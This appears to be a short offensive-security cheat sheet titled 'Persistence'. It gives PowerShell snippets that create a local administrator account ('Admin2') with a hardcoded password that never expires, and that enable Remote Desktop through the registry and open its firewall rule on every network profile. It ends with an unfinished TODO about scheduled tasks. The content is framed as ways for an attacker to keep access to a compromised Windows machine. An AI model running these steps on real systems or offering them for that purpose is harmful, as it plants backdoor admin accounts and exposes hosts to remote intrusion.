# Persistence

## Creating a New Admin User

This script does the following:

- Defines the username and password for the new admin user.
- Creates a new local user account with the specified username and password, and with an account that never expires and a password that never expires.
- Adds the new user to the local Administrators group.

```
# Define the new admin user's username and password
$username = "Admin2"
$password = ConvertTo-SecureString "Password1234" -AsPlainText -Force

# Create the new admin user
New-LocalUser -Name $username -Password $password -AccountNeverExpires -PasswordNeverExpires

# Add the new admin user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $username
```

## Enable RDP

This script does the following:

- Sets the "fDenyTSConnections" registry value to 0, which allows Remote Desktop connections.
- Enables the "Remote Desktop" Windows Firewall rule.
- Updates the "Remote Desktop" Windows Firewall rule to allow connections from any network profile.

```
# Enable Remote Desktop
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

# Allow Remote Desktop through Windows Firewall
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Update the Windows Firewall rule to allow connections from any network
Set-NetFirewallRule -DisplayGroup "Remote Desktop" -Profile Any -Enabled True
```


TODO. Scheduled tasks.

